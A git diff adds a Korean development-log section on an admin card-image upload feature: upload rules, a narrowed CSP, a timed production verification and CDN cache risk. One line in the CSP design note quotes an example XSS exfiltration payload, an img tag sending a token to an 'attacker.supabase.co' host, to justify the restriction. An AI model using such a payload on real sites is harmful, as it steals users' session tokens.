@@ -2271,9 +2271,66 @@ GRANT USAGE, SELECT, UPDATE ON SEQUENCE public."Setlist_id_seq", public."AdminUs
 
 ### 완료 상태 및 다음 단계
 
-- 브랜치 `feature/admin-team-crud`(`develop`에서 분기), 푸시·PR 보류
+- 브랜치 `feature/admin-team-crud`(`develop`에서 분기) → PR #41 → **CI 전체 통과 후 `develop`에 머지 완료**
 - 팀 삭제 UI는 이번 범위에서 제외했다. 필요해지면 별도 work로 백엔드 `DELETE /teams/:id`(연관 `Setlist.teamId` FK 처리 방식 결정 포함) 설계부터 시작한다
 - **다음**: 7c-2b 카드 이미지 업로드(**프로덕션 첫 쓰기 지점**, Supabase Storage 연동) → 7c-3 곡·앨범 커버 → 7c-4 유튜브 리뷰·배치
+
+## 20. work02-7c-2b — 관리자 카드 이미지 업로드 UI (2026-09-22)
+
+### 배경
+
+7c-2a(팀 CRUD) 머지 완료 뒤, 팀 카드뉴스 이미지 업로드를 관리자 UI에 붙였다. 백엔드는 work02-5(§13, PR #35)에서 이미 구현·검증됨(F007) — 새 API를 만드는 게 아니라 기존 업로드 엔드포인트(`PUT /teams/:id/card-image`)를 붙이는 작업이다.
+
+### 구현 전 조사
+
+`apps/api/src/teams/team-card-image.*`·`storage/*`를 읽고 확정한 계약:
+
+- multipart, 필드명 **`file`** 고정, 파일 1개만(`parts: 1`)
+- 크기 상한 **1MB**(앱 레벨. 버킷 자체 제한 2MB보다 앱이 먼저 막음), 형식은 **매직바이트로 판별**(JPEG/PNG/WebP만, 확장자·Content-Type 불신 — 이 레포 실데이터가 `.png` 확장자인데 실제로 JPEG였던 전례가 근거)
+- 업로드마다 새 경로(`{teamId}/{uuid}.ext`), **이전 객체는 지우지 않는다**(CDN `purgeCache` 비활성이라 같은 경로를 덮으면 캐시를 비울 수단이 없음)
+- **삭제 가능 여부**: "정책상 안 함"이 맞고 기능 자체는 있다. `SupabaseStorageClient.remove()`가 실제로 구현돼 있고 서버의 보상 삭제 경로(DB 반영 실패 시)에서 쓰인다. 관리자 HTTP API에만 삭제 엔드포인트가 없다(의도적 제외) — 검증 후 정리하려면 서비스 키로 Storage REST `DELETE`를 직접 호출해야 한다
+
+### 설계 결정 (사용자 승인)
+
+- **CSP img-src**: `csp.ts`의 기존 TODO는 `https://*.supabase.co` 와일드카드를 적어 두었지만, 같은 파일의 "최소 권한, 미리 열어 두지 않는다" 원칙과 어긋난다고 판단해 사용자에게 확인했다. **결과: 와일드카드 대신 `NEXT_PUBLIC_SUPABASE_STORAGE_ORIGIN` 새 환경변수로 우리 프로젝트 오리진 하나만 연다.** `*.supabase.co`는 누구나 무료로 프로젝트를 만들 수 있어, 와일드카드는 XSS 상황에서 `<img src="https://attacker.supabase.co/?=토큰">` 같은 유출 통로가 될 수 있다는 게 근거다
+- **검증 업로드 전략**: 임시 검증 팀(`__verify__` 접두사) 1개를 만들어 그 팀에만 업로드하고, Storage 객체는 서비스 키로 직접 삭제, DB 행은 SQL로 직접 삭제(기존 §19 프로토콜과 동일)
+
+### 작업 내용
+
+- `src/lib/csp.ts`: `supabaseStorageOrigin` 옵션 추가, `next.config.ts`·`.env.example`·`.env.local`에 `NEXT_PUBLIC_SUPABASE_STORAGE_ORIGIN` 배선
+- `src/lib/teams/card-image.ts`(신규): 서버와 같은 규칙(1MB, 매직바이트 판별)의 클라이언트 측 사전 검사 + `cardImageUrl`(절대 URL 또는 기존 15팀의 공개 사이트 상대경로) 해석 함수
+- `src/lib/api/teams.ts`: `uploadTeamCardImage`(PUT, FormData) 추가
+- `src/components/teams/card-image-thumb.tsx`(신규): 목록·폼이 공유하는 썸네일/플레이스홀더
+- `src/components/teams/team-card-image-field.tsx`(신규): 업로드 필드 — 파일 선택 시 즉시 올리지 않고 미리보기 후 **버튼을 눌러야** 올라간다(되돌릴 수 없는 저장소 쓰기라 실수 방지). `key={team.id}`로 다른 팀을 열면 새로 마운트되어 이전 선택이 남지 않게 한다(이펙트에서 setState 하지 않는 방식 — `react-hooks/set-state-in-effect` 회피)
+- `team-edit-dialog.tsx`·`team-day-table.tsx`: 업로드 필드·썸네일 열 연결
+- `eslint.config.mjs`: `@next/next/no-img-element` 끔(이미지 최적화를 껐으므로 `next/image`를 쓸 이유가 없음, 주석으로 근거 명시)
+
+### 검증
+
+- **정적 검증**: typecheck·lint·test(카드 이미지 판별·CSP 오리진 테스트 포함)·build 전부 통과
+- **프로덕션 실동작 검증 — 최소 노출 시간 원칙 적용**: 생성→업로드→삭제를 끊지 않고 연속으로 진행, 전 단계 타임스탬프(UTC) 기록
+
+  | 단계 | 시각 |
+  | --- | --- |
+  | 기준선(팀 15행, 객체 0개) | 14:08:12 |
+  | 사용자 업로드 완료 보고 | 14:12:08 |
+  | 오브젝트 실제 `created_at`(Storage 기록) | 14:11:40 |
+  | Storage 삭제 요청 → 응답 200 | 14:12:25 → 14:12:27 |
+  | DB 행 삭제 요청 | 14:12:30 |
+  | 정리 완료 확인(diff=0) | 14:12:33 |
+
+  오브젝트 노출 시간 약 53초. 정리 후 `Line Up` 15행·`storage.objects` 0개로 기준선과 diff=0 확인. 업로드 파일은 미리 준비한 68바이트 더미 대신 사용자가 고른 158,816바이트 PNG였으나(1MB 상한 안) 결과에 영향 없음
+
+### CDN 캐시 잔존 리스크 (§13에서 이미 알려진 한계, 이번에 다시 확인)
+
+Storage 객체를 지워도 `purgeCache`가 비활성이라 CDN 엣지에 남은 사본은 즉시 사라지지 않는다(`cache-control: max-age=31536000` = 1년). §13 트러블슈팅에도 "실제로 삭제된 객체가 CDN에서 계속 200으로 나왔다"고 기록돼 있다. 즉 **정확한 URL을 아는 사람에게는 삭제 후에도 한동안 이미지가 보일 수 있다.**
+
+다만 실질 노출 위험은 낮다고 판단한다 — 경로가 `{teamId}/{uuid}.ext`로 추측 불가능한 UUID이고, 삭제된 객체의 URL은 DB에서도 즉시 제거되어(이번 검증에서 `image_src` 컬럼째 삭제) **공개 사이트를 포함한 어디에도 그 URL로의 링크가 남지 않는다.** URL을 알아내려면 삭제 직전에 정확한 값을 이미 갖고 있어야 하므로, 일반 방문자나 크롤러가 우연히 도달할 경로가 아니다. 이후 카드 이미지 삭제(예: 7c-2b 검증, 향후 실사용) 때도 같은 전제(추측 불가능한 경로)가 유지되는 한 이 리스크는 낮은 채로 남는다.
+
+### 완료 상태 및 다음 단계
+
+- 브랜치 `feature/admin-team-image-upload`(`develop`에서 분기), 푸시·PR 보류
+- **다음**: 7c-3 곡·앨범 커버 → 7c-4 유튜브 리뷰·배치
 
 ## 부록: 원본 리포트 참조
 
